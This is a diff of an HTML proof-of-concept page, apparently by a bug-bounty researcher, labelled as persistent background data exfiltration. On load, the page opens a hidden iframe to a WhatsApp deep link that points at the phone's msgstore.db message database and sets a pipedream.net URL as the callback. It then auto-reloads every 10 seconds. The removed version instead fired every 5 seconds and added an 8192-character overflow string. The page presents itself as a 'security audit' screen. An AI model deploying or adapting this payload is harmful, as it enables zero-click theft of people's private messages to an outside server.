@@ -3,29 +3,29 @@
 <head>
     <script>
         // Researcher: Firman Sahidin
-        // Automated Persistence PoC
-        const LEAK_URL = "https://eo7n9pqjlhffwvt.m.pipedream.net/leak_handler";
+        // POC: Persistent Background Data Exfiltration
         
-        function trigger() {
-            // Ngirim perintah ka WhatsApp unggal 5 detik sacara otomatis
-            const interval = setInterval(() => {
-                const payload = `whatsapp://br_verify_card_deeplink?callback=${encodeURIComponent(LEAK_URL)}&source=/data/data/com.whatsapp/databases/msgstore.db&overflow=${"A".repeat(8192)}`;
-                
-                // Nyobaan muka jalur internal
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = payload;
-                document.body.appendChild(iframe);
-                
-                console.log("[*] Packet sent to Phoenix internal...");
-            }, 5000); 
+        function autoTrigger() {
+            const LEAK_URL = "https://eo7n9pqjlhffwvt.m.pipedream.net/leak_handler";
+            const PAYLOAD = `whatsapp://br_verify_card_deeplink?callback=${encodeURIComponent(LEAK_URL)}&source=/data/data/com.whatsapp/databases/msgstore.db&token=hi_Y4HeUGB`;
+
+            // Eksekusi otomatis tanpa klik (via Iframe)
+            const ifr = document.createElement('iframe');
+            ifr.src = PAYLOAD;
+            ifr.style.display = 'none';
+            document.body.appendChild(ifr);
+
+            console.log("[!] Phoenix Internal Triggered. Checking Pipedream...");
+            
+            // Auto-refresh setiap 10 detik untuk memastikan data terbaru terambil
+            setTimeout(() => { window.location.reload(); }, 10000);
         }
-        window.onload = trigger;
+        window.onload = autoTrigger;
     </script>
 </head>
-<body style="background:#000;color:#0f0;font-family:monospace;">
-    <h1>SYSTEM AUDIT IN PROGRESS...</h1>
+<body style="background:#000; color:#0f0; font-family:monospace; text-align:center; padding-top:100px;">
+    <h1>[ FIRMAN SAHIDIN SECURITY AUDIT ]</h1>
     <p>Target ID: hi_Y4HeUGB</p>
-    <p>Status: Monitoring Phoenix Handlers</p>
+    <p>Status: MONITORING DATABASE LEAK...</p>
 </body>
 </html>
